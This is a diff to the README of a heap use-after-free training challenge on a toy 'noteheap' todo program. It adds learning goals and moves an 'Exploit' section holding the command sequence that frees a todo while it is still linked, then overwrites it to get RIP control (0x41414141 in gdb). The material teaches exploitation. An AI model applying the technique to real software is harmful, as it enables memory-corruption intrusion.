@@ -1,25 +1,25 @@
-# Noteheap
+# Heap use-after-free analysis
+
+## Introduction
+
+In this challenge, we will analyse a program where we can store "notes" and
+retrieve them later. We will find a bug when deleting an object, and get a
+"dangling pointer" where we can access other objects on the heap.
+
+## Goal
+
+* Understand how heap works
+* Understand how use-after-free works
+* Get our static and dynamic analysis skills to the next level
 
 ## Source
 
 Execute `make` in the directory `~/challenges/challenge31`.
 
 
+### Interface
 
-## Exploit
-
-```
-todo add work 64 test
-todolist add private work:0
-todolist del work:0
-
-
-alarm add testalarm
-todo edit private:0 456 "AA"
-alarm del 0
-```
-
-## Interface
+The noteheap program understands the following commands:
 
 ```
 > help
@@ -64,12 +64,10 @@ Todo added to list work as nr 0 (prio 0x40, body: "test")
 ```
 
 Now add this todo also to the list `private`:
-
 ```
 > todolist add private work:0
 Added todo from work:0 to private:0
 ```
-
 
 This todo is not available in both lists:
 ```
@@ -222,4 +220,18 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb)
 ```
 
-Success! RIP is set to 0x41414141, as we intended. 
+Success! RIP is set to 0x41414141, as we intended.
+
+
+## Exploit
+
+```
+todo add work 64 test
+todolist add private work:0
+todolist del work:0
+
+
+alarm add testalarm
+todo edit private:0 456 "AA"
+alarm del 0
+```
